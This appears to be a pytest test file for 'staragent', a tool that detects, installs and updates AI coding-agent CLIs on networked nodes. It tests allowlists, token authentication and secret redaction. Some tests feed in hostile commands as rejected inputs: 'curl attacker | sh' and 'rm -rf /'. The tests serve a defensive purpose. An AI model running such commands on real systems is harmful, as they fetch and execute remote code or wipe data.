from __future__ import annotations

import subprocess
import threading
import urllib.error
from datetime import UTC, datetime
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient

from staragent import agent_auth, agent_tools, agent_usage, hub
from staragent.dashboard import app as dashboard_app
from staragent.node import app as node_app


def tool_by_name(payload: dict[str, object], name: str) -> dict[str, object]:
    tools = payload.get("tools")
    assert isinstance(tools, list)
    return next(item for item in tools if isinstance(item, dict) and item.get("name") == name)


@pytest.fixture(autouse=True)
def stub_agent_usage_probe(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("CODEX_HOME", str(tmp_path / "codex-home"))
    monkeypatch.setattr(
        agent_tools,
        "probe_agent_usage",
        lambda agent, executable: agent_usage.unknown_agent_usage(agent, "test usage"),
    )
    monkeypatch.setattr(
        agent_tools,
        "probe_agent_auth",
        lambda agent, executable: agent_auth.unknown_agent_auth(agent, "test auth"),
    )


def test_agent_tool_detection_reports_versions_in_parallel(monkeypatch) -> None:
    barrier = threading.Barrier(2)
    versions = {
        "codex": "codex-cli 1.2.3\n",
        "claude": "2.3.4 (Claude Code)\n",
    }
    monkeypatch.setattr(
        agent_tools.shutil,
        "which",
        lambda command, path=None: f"/tools/{command}" if command in versions else None,
    )

    def fake_run(args, **kwargs):  # type: ignore[no-untyped-def]
        barrier.wait(timeout=1)
        assert kwargs["env"]["DISABLE_AUTOUPDATER"] == "1"
        assert kwargs["env"]["CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC"] == "1"
        return subprocess.CompletedProcess(args, 0, versions[args[0].rsplit("/", 1)[-1]], "")

    monkeypatch.setattr(agent_tools.subprocess, "run", fake_run)
    agent_tools.clear_agent_tools_cache()

    payload = agent_tools.agent_tools_payload(force=True)

    assert tool_by_name(payload, "codex")["version"] == "codex-cli 1.2.3"
    assert tool_by_name(payload, "claude")["version"] == "2.3.4 (Claude Code)"
    assert tool_by_name(payload, "opencode")["status"] == "missing"


def test_agent_tool_detection_distinguishes_missing_and_broken(monkeypatch) -> None:
    monkeypatch.setattr(
        agent_tools.shutil,
        "which",
        lambda command, path=None: None if command == "codex" else "/tools/claude",
    )
    monkeypatch.setattr(
        agent_tools.subprocess,
        "run",
        lambda args, **kwargs: subprocess.CompletedProcess(args, 1, "", "broken install"),
    )
    agent_tools.clear_agent_tools_cache()

    payload = agent_tools.agent_tools_payload(force=True)

    codex = tool_by_name(payload, "codex")
    claude = tool_by_name(payload, "claude")
    assert codex["status"] == "missing"
    assert codex["installed"] is False
    assert claude["status"] == "error"
    assert claude["installed"] is True
    assert claude["error"] == "broken install"


def test_agent_tool_detection_times_out_without_hanging(monkeypatch) -> None:
    monkeypatch.setattr(
        agent_tools.shutil,
        "which",
        lambda command, path=None: f"/tools/{command}",
    )

    def timeout(args, **kwargs):  # type: ignore[no-untyped-def]
        raise subprocess.TimeoutExpired(args, kwargs["timeout"])

    monkeypatch.setattr(agent_tools.subprocess, "run", timeout)
    agent_tools.clear_agent_tools_cache()

    payload = agent_tools.agent_tools_payload(force=True)

    assert all(item["status"] == "error" for item in payload["tools"])
    assert all("timed out" in str(item["error"]) for item in payload["tools"])


def test_agent_tool_detection_uses_ttl_cache(monkeypatch) -> None:
    calls: list[str] = []
    monkeypatch.setattr(
        agent_tools.shutil,
        "which",
        lambda command, path=None: f"/tools/{command}",
    )

    def fake_run(args, **kwargs):  # type: ignore[no-untyped-def]
        calls.append(args[0])
        return subprocess.CompletedProcess(args, 0, "version 1", "")

    monkeypatch.setattr(agent_tools.subprocess, "run", fake_run)
    agent_tools.clear_agent_tools_cache()

    first = agent_tools.agent_tools_payload(force=True)
    second = agent_tools.agent_tools_payload()

    assert first == second
    assert len(calls) == 3


def test_normalized_remote_payload_only_accepts_known_tools() -> None:
    normalized = agent_tools.normalize_agent_tools_payload(
        {
            "supported": True,
            "checked_at": "2026-07-10T12:00:00Z",
            "tools": [
                {
                    "name": "codex",
                    "status": "available",
                    "version": "codex 1",
                    "executable": "/bin/codex",
                    "update": {
                        "status": "up_to_date",
                        "current_version": "1.0.0",
                        "latest_version": "1.0.0",
                        "source": "codex_version_cache",
                        "private": "ignored",
                    },
                },
                {"name": "rogue", "status": "available", "version": "ignored"},
            ],
        }
    )

    assert [item["name"] for item in normalized["tools"]] == [
        "codex",
        "claude",
        "opencode",
    ]
    codex_update = tool_by_name(normalized, "codex")["update"]
    assert codex_update["status"] == "up_to_date"
    assert codex_update["latest_version"] == "1.0.0"
    assert "private" not in codex_update
    assert tool_by_name(normalized, "claude")["status"] == "unknown"


def test_agent_tool_status_detects_npm_and_exposes_safe_update_command() -> None:
    spec = agent_tools.agent_tool_spec("codex")
    assert spec is not None

    status = agent_tools.tool_status(
        spec,
        status="available",
        executable="/usr/local/bin/codex",
        resolved_executable="/usr/local/lib/node_modules/@openai/codex/bin/codex.js",
        version="codex-cli 1.2.3",
    )

    assert status["install_method"] == "npm"
    assert status["update_command"] == "npm install -g @openai/codex@latest"
    assert status["update_action"] == "update"


def test_missing_agent_tools_offer_official_and_china_install_sources(monkeypatch) -> None:
    monkeypatch.setattr(
        agent_tools.shutil,
        "which",
        lambda command, path=None: (
            f"/usr/bin/{command}" if command in {"bash", "npm", "sh"} else None
        ),
    )

    for spec in agent_tools.AGENT_TOOL_SPECS:
        status = agent_tools.tool_status(spec, status="missing")
        options = status["install_options"]
        assert isinstance(options, list)
        by_id = {item["id"]: item for item in options}

        assert set(by_id) == {
            "official-native",
            "official-npm",
            "npmmirror",
            "tencent-mirror",
        }
        assert by_id["official-native"]["recommended"] is True
        assert by_id["official-native"]["source"] == "official"
        assert by_id["official-npm"]["source"] == "official"
        assert by_id["npmmirror"]["china"] is True
        assert by_id["tencent-mirror"]["china"] is True
        assert "--registry=https://registry.npmmirror.com" in by_id["npmmirror"]["command"]
        assert (
            "--registry=https://mirrors.cloud.tencent.com/npm/"
            in by_id["tencent-mirror"]["command"]
        )
        assert all(item["available"] is True for item in options)
        assert all("npm config" not in str(item["command"]) for item in options)


def test_windows_install_options_work_without_system_npm(monkeypatch) -> None:
    spec = agent_tools.agent_tool_spec("codex")
    assert spec is not None
    monkeypatch.setattr(
        agent_tools.shutil,
        "which",
        lambda command, path=None: (
            "C:/Windows/System32/powershell.exe" if command == "powershell.exe" else None
        ),
    )

    options = agent_tools.install_options_payload(spec, platform_name="windows")
    by_id = {item["id"]: item for item in options}

    assert by_id["official-native"]["command"].startswith("powershell ")
    assert by_id["official-native"]["available"] is True
    assert by_id["official-native"]["recommended"] is True
    assert by_id["official-native"]["native_binary"] is False
    assert by_id["official-npm"]["available"] is False
    assert by_id["official-npm"]["recommended"] is False
    assert by_id["official-npm"]["missing_requirements"] == ["npm"]
    assert by_id["npmmirror"]["available"] is False
    assert by_id["npmmirror"]["missing_requirements"] == ["npm"]

    opencode = agent_tools.agent_tool_spec("opencode")
    assert opencode is not None
    opencode_options = {
        item["id"]: item
        for item in agent_tools.install_options_payload(
            opencode,
            platform_name="windows",
        )
    }
    assert opencode_options["official-native"]["available"] is True
    assert opencode_options["official-native"]["recommended"] is True
    assert opencode_options["official-native"]["native_binary"] is True
    assert opencode_options["official-native"]["command"] == ""
    assert opencode_options["official-npm"]["available"] is False


def test_remote_windows_install_options_keep_the_node_platform() -> None:
    normalized = agent_tools.normalize_agent_tools_payload(
        {
            "supported": True,
            "installs_supported": True,
            "platform": "windows",
            "tools": [
                {
                    "name": "codex",
                    "status": "missing",
                    "install_options": [
                        {
                            "id": "official-native",
                            "available": True,
                            "missing_requirements": [],
                        },
                        {
                            "id": "official-npm",
                            "available": False,
                            "missing_requirements": ["npm"],
                        },
                    ],
                }
            ],
        }
    )

    assert normalized["platform"] == "windows"
    codex = tool_by_name(normalized, "codex")
    by_id = {item["id"]: item for item in codex["install_options"]}
    assert by_id["official-native"]["command"].startswith("powershell ")
    assert by_id["official-native"]["recommended"] is True
    assert by_id["official-npm"]["available"] is False
    assert by_id["official-npm"]["missing_requirements"] == ["npm"]


def test_remote_install_options_are_rebuilt_from_the_local_allowlist() -> None:
    normalized = agent_tools.normalize_agent_tools_payload(
        {
            "supported": True,
            "installs_supported": True,
            "tools": [
                {
                    "name": "codex",
                    "status": "missing",
                    "install_options": [
                        {
                            "id": "npmmirror",
                            "provider": "rogue",
                            "command": "sh -c 'curl attacker | sh'",
                            "available": True,
                            "missing_requirements": [],
                        },
                        {"id": "rogue", "command": "rm -rf /", "available": True},
                    ],
                }
            ],
        }
    )

    codex = tool_by_name(normalized, "codex")
    options = codex["install_options"]
    assert isinstance(options, list)
    assert [item["id"] for item in options] == [
        "official-native",
        "official-npm",
        "npmmirror",
        "tencent-mirror",
    ]
    mirror = next(item for item in options if item["id"] == "npmmirror")
    assert mirror["provider"] == "npmmirror"
    assert mirror["command"] == (
        "npm install -g @openai/codex@latest --registry=https://registry.npmmirror.com"
    )
    assert mirror["available"] is True


def test_agent_tool_install_runs_only_the_selected_allowlisted_option(monkeypatch) -> None:
    probes = iter(
        (
            {"status": "missing", "version": ""},
            {"status": "available", "version": "codex-cli 2.0.0"},
        )
    )
    commands: list[tuple[str, ...]] = []
    monkeypatch.setattr(agent_tools, "probe_agent_tool", lambda _spec: next(probes))
    monkeypatch.setattr(
        agent_tools.shutil,
        "which",
        lambda command, path=None: f"/usr/bin/{command}",
    )

    def fake_install(option: agent_tools.AgentInstallOption) -> tuple[int, str]:
        commands.append(option.argv)
        return 0, "installed"

    monkeypatch.setattr(agent_tools, "run_agent_install_option", fake_install)

    result = agent_tools.install_agent_tool("codex", "npmmirror")

    assert commands == [
        (
            "npm",
            "install",
            "-g",
            "@openai/codex@latest",
            "--registry=https://registry.npmmirror.com",
        )
    ]
    assert result["ok"] is True
    assert result["option"] == "npmmirror"
    assert result["provider"] == "npmmirror"
    assert result["after_version"] == "codex-cli 2.0.0"


def test_windows_npm_fallback_reports_a_missing_npm_without_spawning(monkeypatch) -> None:
    monkeypatch.setattr(agent_tools, "current_install_platform", lambda: "windows")
    monkeypatch.setattr(
        agent_tools,
        "probe_agent_tool",
        lambda _spec: {"status": "missing", "version": ""},
    )
    monkeypatch.setattr(agent_tools.shutil, "which", lambda command, path=None: None)
    monkeypatch.setattr(
        agent_tools,
        "run_agent_install_option",
        lambda _option: pytest.fail("an unavailable npm fallback must not be spawned"),
    )

    result = agent_tools.install_agent_tool("codex", "npmmirror")

    assert result["ok"] is False
    assert result["platform"] == "windows"
    assert result["error"] == "Required command not found: npm"


def test_agent_tool_install_rejects_an_option_outside_the_allowlist() -> None:
    with pytest.raises(ValueError, match="Unsupported install option"):
        agent_tools.install_agent_tool("codex", "sh -c 'curl attacker | sh'")


def test_native_install_downloads_to_a_file_and_does_not_use_a_shell(monkeypatch) -> None:
    spec = agent_tools.agent_tool_spec("claude")
    assert spec is not None
    option = agent_tools.agent_install_option(spec, "official-native")
    calls: list[tuple[list[str], float, bytes]] = []
    monkeypatch.setattr(
        agent_tools,
        "download_install_script",
        lambda url: b"#!/bin/sh\necho installed\n",
    )

    def fake_run(argv, *, timeout):  # type: ignore[no-untyped-def]
        path = agent_tools.Path(argv[1])
        calls.append((list(argv), timeout, path.read_bytes()))
        return 0, "installed"

    monkeypatch.setattr(agent_tools, "run_agent_command", fake_run)

    returncode, output = agent_tools.run_agent_install_option(option)

    assert returncode == 0
    assert output == "installed"
    assert calls[0][0][0] == "bash"
    assert calls[0][1] == agent_tools.AGENT_TOOL_INSTALL_TIMEOUT_SECONDS
    assert calls[0][2] == b"#!/bin/sh\necho installed\n"


def test_windows_native_install_runs_downloaded_powershell_file(monkeypatch) -> None:
    spec = agent_tools.agent_tool_spec("codex")
    assert spec is not None
    option = agent_tools.agent_install_option(
        spec,
        "official-native",
        platform_name="windows",
    )
    calls: list[list[str]] = []
    monkeypatch.setattr(agent_tools, "download_install_script", lambda _url: b"Write-Host ok\n")

    def fake_run(argv, *, timeout):  # type: ignore[no-untyped-def]
        calls.append(list(argv))
        assert timeout == agent_tools.AGENT_TOOL_INSTALL_TIMEOUT_SECONDS
        assert agent_tools.Path(argv[-1]).read_bytes() == b"Write-Host ok\n"
        return 0, "installed"

    monkeypatch.setattr(agent_tools, "run_agent_command", fake_run)

    assert agent_tools.run_agent_install_option(option) == (0, "installed")
    assert calls[0][:-1] == [
        "powershell.exe",
        "-NoProfile",
        "-ExecutionPolicy",
        "Bypass",
        "-File",
    ]


def test_windows_opencode_install_uses_the_verified_native_release(monkeypatch) -> None:
    spec = agent_tools.agent_tool_spec("opencode")
    assert spec is not None
    option = agent_tools.agent_install_option(
        spec,
        "official-native",
        platform_name="windows",
    )
    monkeypatch.setattr(
        agent_tools,
        "install_opencode_windows",
        lambda: SimpleNamespace(version="v1.2.3"),
    )

    returncode, output = agent_tools.run_agent_install_option(option)

    assert returncode == 0
    assert output == "Installed OpenCode v1.2.3 from its verified official Windows release."


def test_normalized_agent_install_result_rejects_untrusted_commands() -> None:
    result = agent_tools.normalize_agent_install_result(
        "codex",
        {
            "ok": True,
            "option": "npmmirror",
            "command": "rm -rf /",
            "output": "Authorization: Bearer secret-value",
            "private": "must not cross the Hub boundary",
        },
    )

    assert result["ok"] is False
    assert result["agent"] == "codex"
    assert result["command"] == ""
    assert "secret-value" not in str(result["output"])
    assert "private" not in result


def test_codex_update_cache_marks_the_installed_version_as_current(tmp_path) -> None:
    cache = tmp_path / "version.json"
    cache.write_text(
        '{"latest_version":"0.153.4","last_checked_at":"2026-09-06T00:00:00Z"}',
        encoding="utf-8",
    )

    update = agent_tools.probe_codex_update_status(
        "codex-cli 0.153.4",
        cache_path=cache,
        now=datetime(2026, 9, 6, 1, tzinfo=UTC),
    )

    assert update == {
        "status": "up_to_date",
        "current_version": "0.153.4",
        "latest_version": "0.153.4",
        "checked_at": "2026-09-06T00:00:00Z",
        "source": "codex_version_cache",
    }


def test_codex_update_cache_reports_a_newer_version(tmp_path) -> None:
    cache = tmp_path / "version.json"
    cache.write_text(
        '{"latest_version":"0.154.0","last_checked_at":"2026-09-06T00:00:00Z"}',
        encoding="utf-8",
    )

    update = agent_tools.probe_codex_update_status(
        "codex-cli 0.153.4",
        cache_path=cache,
        now=datetime(2026, 9, 6, 1, tzinfo=UTC),
    )

    assert update["status"] == "update_available"
    assert update["latest_version"] == "0.154.0"


def test_codex_update_cache_does_not_trust_stale_results(tmp_path) -> None:
    cache = tmp_path / "version.json"
    cache.write_text(
        '{"latest_version":"0.153.4","last_checked_at":"2026-09-01T00:00:00Z"}',
        encoding="utf-8",
    )

    update = agent_tools.probe_codex_update_status(
        "codex-cli 0.153.4",
        cache_path=cache,
        now=datetime(2026, 9, 6, 1, tzinfo=UTC),
    )

    assert update["status"] == "unknown"


def test_agent_tool_update_skips_an_already_current_codex(monkeypatch) -> None:
    spec = agent_tools.agent_tool_spec("codex")
    assert spec is not None
    current = agent_tools.tool_status(
        spec,
        status="available",
        executable="/usr/local/bin/codex",
        resolved_executable="/usr/local/lib/node_modules/@openai/codex/bin/codex.js",
        version="codex-cli 0.153.4",
        update={
            "status": "up_to_date",
            "current_version": "0.153.4",
            "latest_version": "0.153.4",
        },
    )
    monkeypatch.setattr(agent_tools, "probe_agent_tool", lambda _spec: current)
    monkeypatch.setattr(
        agent_tools,
        "run_agent_update_command",
        lambda _argv: pytest.fail("an up-to-date Codex must not run an update command"),
    )

    result = agent_tools.update_agent_tool("codex")

    assert result["ok"] is True
    assert result["changed"] is False
    assert result["command"] == ""
    assert result["before_version"] == "codex-cli 0.153.4"
    assert result["after_version"] == "codex-cli 0.153.4"


def test_agent_tool_update_runs_only_the_detected_allowlisted_command(monkeypatch) -> None:
    spec = agent_tools.agent_tool_spec("codex")
    assert spec is not None
    before = agent_tools.tool_status(
        spec,
        status="available",
        executable="/usr/local/bin/codex",
        resolved_executable="/usr/local/lib/node_modules/@openai/codex/bin/codex.js",
        version="codex-cli 1.2.3",
    )
    after = {**before, "version": "codex-cli 1.2.4"}
    probes = iter((before, after))
    commands: list[list[str]] = []
    monkeypatch.setattr(agent_tools, "probe_agent_tool", lambda _spec: next(probes))

    def fake_update(argv: list[str]) -> tuple[int, str]:
        commands.append(argv)
        return 0, "updated"

    monkeypatch.setattr(agent_tools, "run_agent_update_command", fake_update)

    result = agent_tools.update_agent_tool("codex")

    assert commands == [["npm", "install", "-g", "@openai/codex@latest"]]
    assert result["ok"] is True
    assert result["changed"] is True
    assert result["before_version"] == "codex-cli 1.2.3"
    assert result["after_version"] == "codex-cli 1.2.4"


def test_agent_tool_update_rejects_a_command_outside_the_allowlist() -> None:
    spec = agent_tools.agent_tool_spec("codex")
    assert spec is not None

    with pytest.raises(ValueError, match="Unsupported update command"):
        agent_tools.update_argv(
            spec,
            {"install_method": "npm", "executable": "/usr/local/bin/codex"},
            "sh -c 'echo unsafe'",
        )


def test_agent_tool_update_failure_is_bounded_and_redacted(monkeypatch) -> None:
    spec = agent_tools.agent_tool_spec("codex")
    assert spec is not None
    before = agent_tools.tool_status(
        spec,
        status="available",
        executable="/usr/local/bin/codex",
        resolved_executable="/usr/local/lib/node_modules/@openai/codex/bin/codex.js",
        version="codex-cli 1.2.3",
    )
    monkeypatch.setattr(agent_tools, "probe_agent_tool", lambda _spec: before)
    monkeypatch.setattr(
        agent_tools,
        "run_agent_update_command",
        lambda _argv: (1, "token=super-secret\nupdate failed"),
    )

    result = agent_tools.update_agent_tool("codex")

    assert result["ok"] is False
    assert "super-secret" not in str(result["output"])
    assert "super-secret" not in str(result["error"])
    assert "[REDACTED]" in str(result["error"])


def test_agent_tool_update_reports_a_concurrent_update() -> None:
    lock = agent_tools._UPDATE_LOCKS["codex"]
    lock.acquire()
    try:
        with pytest.raises(agent_tools.AgentToolUpdateBusyError, match="already being updated"):
            agent_tools.update_agent_tool("codex")
    finally:
        lock.release()


def test_normalized_agent_update_result_drops_untrusted_fields() -> None:
    result = agent_tools.normalize_agent_update_result(
        "codex",
        {
            "ok": True,
            "agent": "rogue",
            "command": "rm -rf /",
            "output": "Authorization: Bearer secret-value",
            "private": "must not cross the Hub boundary",
        },
    )

    assert result["agent"] == "codex"
    assert result["command"] == ""
    assert "secret-value" not in str(result["output"])
    assert "private" not in result


def test_agent_update_subprocess_is_noninteractive_and_does_not_use_a_shell(monkeypatch) -> None:
    calls: list[tuple[list[str], dict[str, object]]] = []

    def fake_run(argv, **kwargs):  # type: ignore[no-untyped-def]
        calls.append((argv, kwargs))
        return subprocess.CompletedProcess(argv, 0, "updated", "")

    monkeypatch.setattr(agent_tools.subprocess, "run", fake_run)

    returncode, output = agent_tools.run_agent_update_command(["codex", "update"])

    assert returncode == 0
    assert output == "updated"
    assert calls[0][0] == ["codex", "update"]
    assert "shell" not in calls[0][1]
    assert calls[0][1]["stdin"] is subprocess.DEVNULL
    assert calls[0][1]["env"]["npm_config_update_notifier"] == "false"


def test_agent_catalog_and_session_presets_cover_the_same_clis() -> None:
    from staragent.presets import command_presets_payload

    catalog_payload = agent_tools.agent_catalog_payload()
    catalog = {item["name"] for item in catalog_payload}
    preset_agents = {
        item["agent"] for item in command_presets_payload() if item["agent"] != "shell"
    }

    assert catalog == {"codex", "claude", "opencode"}
    assert all(item["vendor"] for item in catalog_payload)
    assert all(item["description"] for item in catalog_payload)
    assert all(str(item["icon"]).startswith("agent-icons/") for item in catalog_payload)
    assert all(str(item["accent"]).startswith("#") for item in catalog_payload)
    assert preset_agents == catalog
    assert all("ops_compatible" in item for item in command_presets_payload())


def test_remote_session_heartbeat_caches_agent_tools(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("STARAGENT_STATE_DIR", str(tmp_path))
    hub.clear_node_heartbeat_cache()
    node = hub.NodeEntry(name="worker", url="http://worker:8081", mode="lan")
    reported = agent_tools.unknown_agent_tools_payload("not installed", supported=True)
    monkeypatch.setattr(
        hub,
        "request_json",
        lambda *args, **kwargs: {"sessions": [], "agent_tools": reported},
    )

    assert hub.remote_sessions(node) == []
    cached = hub.cached_node_agent_tools(node)

    assert cached is not None
    assert cached["node"] == "worker"
    assert cached["supported"] is True


def test_capable_node_heartbeat_defers_cli_probe_until_agents_page(monkeypatch) -> None:
    hub.clear_node_heartbeat_cache()
    node = hub.NodeEntry(name="worker", url="http://worker:8081", mode="lan")
    monkeypatch.setattr(
        hub,
        "request_json",
        lambda *args, **kwargs: {
            "sessions": [],
            "capabilities": {"agent_tools": 1},
        },
    )

    assert hub.remote_sessions(node) == []
    assert hub.cached_node_agent_tools(node) is None


def test_old_remote_node_reports_update_required(monkeypatch) -> None:
    hub.clear_node_heartbeat_cache()
    node = hub.NodeEntry(name="old-worker", url="http://old-worker:8081", mode="lan")

    def missing_endpoint(*args, **kwargs):  # type: ignore[no-untyped-def]
        raise urllib.error.HTTPError("/api/agent-tools", 404, "Not Found", {}, None)

    monkeypatch.setattr(hub, "request_json", missing_endpoint)

    payload = hub.node_agent_tools_payload(node)

    assert payload["supported"] is False
    assert payload["node"] == "old-worker"
    assert "update required" in str(payload["error"]).lower()
    assert all(item["status"] == "unknown" for item in payload["tools"])


def test_old_node_heartbeat_caches_unsupported_detection(monkeypatch) -> None:
    hub.clear_node_heartbeat_cache()
    node = hub.NodeEntry(name="old-worker", url="http://old-worker:8081", mode="lan")
    monkeypatch.setattr(hub, "request_json", lambda *args, **kwargs: {"sessions": []})

    hub.remote_sessions(node)
    monkeypatch.setattr(
        hub,
        "request_json",
        lambda *args, **kwargs: (_ for _ in ()).throw(
            AssertionError("cached legacy result should not make another request")
        ),
    )

    payload = hub.node_agent_tools_payload(node)

    assert payload["supported"] is False
    assert "update required" in str(payload["error"]).lower()


def test_remote_probe_failure_returns_stale_cached_result(monkeypatch) -> None:
    hub.clear_node_heartbeat_cache()
    node = hub.NodeEntry(name="worker", url="http://worker:8081", mode="lan")
    cached = {
        "supported": True,
        "checked_at": "2026-07-10T12:00:00Z",
        "tools": [
            {"name": "codex", "status": "available", "version": "codex 1"},
            {"name": "claude", "status": "missing", "error": "not found"},
        ],
    }
    hub.remember_node_agent_tools(node, cached)
    monkeypatch.setattr(
        hub,
        "request_json",
        lambda *args, **kwargs: (_ for _ in ()).throw(urllib.error.URLError("offline")),
    )

    payload = hub.node_agent_tools_payload(node, refresh=True)

    assert payload["stale"] is True
    assert tool_by_name(payload, "codex")["status"] == "available"
    assert "offline" in str(payload["error"])


def test_cached_tool_result_is_stale_when_node_heartbeat_fails() -> None:
    hub.clear_node_heartbeat_cache()
    node = hub.NodeEntry(name="worker", url="http://worker:8081", mode="lan")
    hub.remember_node_agent_tools(
        node,
        {
            "supported": True,
            "tools": [
                {"name": "codex", "status": "available", "version": "codex 1"},
                {"name": "claude", "status": "available", "version": "claude 1"},
            ],
        },
    )
    with hub.NODE_HEARTBEATS_LOCK:
        hub.NODE_HEARTBEATS[node.name] = hub.NodeHeartbeat(
            endpoint=node.url or "",
            sessions=(),
            last_success=hub.time.monotonic(),
            failures=1,
            last_error="offline",
        )

    payload = hub.cached_node_agent_tools(node)

    assert payload is not None
    assert payload["stale"] is True


def test_node_agent_tools_endpoint_is_authenticated(monkeypatch) -> None:
    monkeypatch.setenv("STARAGENT_NODE_TOKEN", "node-secret")
    monkeypatch.setattr(
        node_app,
        "agent_tools_payload",
        lambda force=False: agent_tools.unknown_agent_tools_payload("test", supported=True),
    )
    monkeypatch.setattr(node_app, "collect_session_views", lambda: [])
    client = TestClient(node_app.create_app())

    assert client.get("/api/agent-tools").status_code == 401
    response = client.get(
        "/api/agent-tools?refresh=true",
        headers={"Authorization": "Bearer node-secret"},
    )

    assert response.status_code == 200
    assert response.json()["supported"] is True
    sessions = client.get(
        "/api/sessions",
        headers={"Authorization": "Bearer node-secret"},
    ).json()
    assert sessions["capabilities"]["agent_tools"] == 6
    assert sessions["capabilities"]["agent_auth"] == 1
    assert sessions["capabilities"]["agent_install"] == 1
    assert sessions["capabilities"]["agent_update"] == 1
    assert sessions["capabilities"]["agent_usage"] == 1
    assert sessions["capabilities"]["agent_history"] == 1
    assert sessions["capabilities"]["agent_terminal"] == 1
    assert "agent_tools" not in sessions


def test_dashboard_agent_tools_route_supports_manual_refresh(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("STARAGENT_STATE_DIR", str(tmp_path))
    node = hub.NodeEntry(name="local", url="local", mode="local")
    calls: list[tuple[str, bool]] = []
    monkeypatch.setattr(dashboard_app, "node_by_name", lambda name: node)

    def fake_payload(selected, refresh=False):  # type: ignore[no-untyped-def]
        calls.append((selected.name, refresh))
        return agent_tools.payload_with_node(
            agent_tools.unknown_agent_tools_payload("test", supported=True),
            selected.name,
        )

    monkeypatch.setattr(dashboard_app, "node_agent_tools_payload", fake_payload)
    response = TestClient(dashboard_app.create_app()).get(
        "/api/nodes/local/agent-tools?refresh=true"
    )

    assert response.status_code == 200
    assert response.json()["node"] == "local"
    assert calls == [("local", True)]


def test_node_agent_update_endpoint_is_authenticated_and_logged(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("STARAGENT_STATE_DIR", str(tmp_path))
    monkeypatch.setenv("STARAGENT_NODE_TOKEN", "node-secret")
    events: list[tuple[str, str, dict[str, object]]] = []
    result = {
        "ok": True,
        "agent": "codex",
        "label": "Codex",
        "before_version": "codex-cli 1.2.3",
        "after_version": "codex-cli 1.2.4",
        "changed": True,
        "error": "",
    }
    monkeypatch.setattr(node_app, "update_agent_tool", lambda agent: result)
    monkeypatch.setattr(
        node_app,
        "append_node_outbox_event",
        lambda level, event, message, **kwargs: events.append(
            (level, event, kwargs.get("details", {}))
        ),
    )
    client = TestClient(node_app.create_app())

    assert client.post("/api/agent-tools/codex/update").status_code == 401
    response = client.post(
        "/api/agent-tools/codex/update",
        headers={"Authorization": "Bearer node-secret"},
    )

    assert response.status_code == 200
    assert response.json()["changed"] is True
    assert events == [
        (
            "info",
            "agent.update_succeeded",
            {
                "agent": "codex",
                "before_version": "codex-cli 1.2.3",
                "after_version": "codex-cli 1.2.4",
                "changed": True,
                "error": "",
            },
        )
    ]


def test_node_agent_install_endpoint_is_authenticated_and_logged(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("STARAGENT_STATE_DIR", str(tmp_path))
    monkeypatch.setenv("STARAGENT_NODE_TOKEN", "node-secret")
    events: list[tuple[str, str, dict[str, object]]] = []
    result = {
        "ok": True,
        "agent": "codex",
        "label": "Codex",
        "option": "npmmirror",
        "source": "mirror",
        "after_status": "available",
        "after_version": "codex-cli 2.0.0",
        "error": "",
    }
    monkeypatch.setattr(
        node_app,
        "install_agent_tool",
        lambda agent, option_id: result,
    )
    monkeypatch.setattr(
        node_app,
        "append_node_outbox_event",
        lambda level, event, message, **kwargs: events.append(
            (level, event, kwargs.get("details", {}))
        ),
    )
    client = TestClient(node_app.create_app())

    assert client.post("/api/agent-tools/codex/install/npmmirror").status_code == 401
    response = client.post(
        "/api/agent-tools/codex/install/npmmirror",
        headers={"Authorization": "Bearer node-secret"},
    )

    assert response.status_code == 200
    assert response.json()["option"] == "npmmirror"
    assert events == [
        (
            "info",
            "agent.install_succeeded",
            {
                "agent": "codex",
                "option": "npmmirror",
                "source": "mirror",
                "after_status": "available",
                "after_version": "codex-cli 2.0.0",
                "error": "",
            },
        )
    ]


def test_remote_agent_update_is_proxied_and_normalized(monkeypatch) -> None:
    node = hub.NodeEntry(name="worker", url="http://worker:8081", mode="lan")
    calls: list[tuple[str, str, float]] = []

    def fake_request_json(selected, method, path, body=None, timeout=0):  # type: ignore[no-untyped-def]
        calls.append((method, path, timeout))
        return {
            "ok": True,
            "agent": "rogue",
            "label": "Untrusted label",
            "command": "npm install -g @openai/codex@latest",
            "before_version": "codex-cli 1.2.3",
            "after_version": "codex-cli 1.2.4",
            "changed": True,
            "private": "do not forward",
        }

    monkeypatch.setattr(hub, "request_json", fake_request_json)

    result = hub.node_agent_tool_update_payload(node, "codex")

    assert calls == [
        (
            "POST",
            "/api/agent-tools/codex/update",
            hub.NODE_AGENT_UPDATE_REQUEST_TIMEOUT_SECONDS,
        )
    ]
    assert result["agent"] == "codex"
    assert result["label"] == "Codex"
    assert result["node"] == "worker"
    assert "private" not in result


def test_remote_agent_update_explains_that_an_old_node_must_be_updated(monkeypatch) -> None:
    node = hub.NodeEntry(name="old-worker", url="http://old-worker:8081", mode="lan")
    monkeypatch.setattr(
        hub,
        "request_json",
        lambda *args, **kwargs: (_ for _ in ()).throw(
            urllib.error.HTTPError("/api/agent-tools/codex/update", 404, "Not Found", {}, None)
        ),
    )

    result = hub.node_agent_tool_update_payload(node, "codex")

    assert result["ok"] is False
    assert "Node update required" in str(result["error"])


def test_remote_agent_install_is_proxied_and_normalized(monkeypatch) -> None:
    node = hub.NodeEntry(name="worker", url="http://worker:8081", mode="lan")
    calls: list[tuple[str, str, float]] = []
    spec = agent_tools.agent_tool_spec("codex")
    assert spec is not None
    option = agent_tools.agent_install_option(spec, "npmmirror")

    def fake_request_json(selected, method, path, body=None, timeout=0):  # type: ignore[no-untyped-def]
        calls.append((method, path, timeout))
        return {
            "ok": True,
            "agent": "rogue",
            "label": "Untrusted label",
            "option": option.id,
            "command": option.command,
            "after_status": "available",
            "after_version": "codex-cli 2.0.0",
            "changed": True,
            "private": "do not forward",
        }

    monkeypatch.setattr(hub, "request_json", fake_request_json)

    result = hub.node_agent_tool_install_payload(node, "codex", "npmmirror")

    assert calls == [
        (
            "POST",
            "/api/agent-tools/codex/install/npmmirror",
            hub.NODE_AGENT_INSTALL_REQUEST_TIMEOUT_SECONDS,
        )
    ]
    assert result["ok"] is True
    assert result["agent"] == "codex"
    assert result["label"] == "Codex"
    assert result["node"] == "worker"
    assert "private" not in result


def test_dashboard_agent_update_route_targets_the_selected_node(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("STARAGENT_STATE_DIR", str(tmp_path))
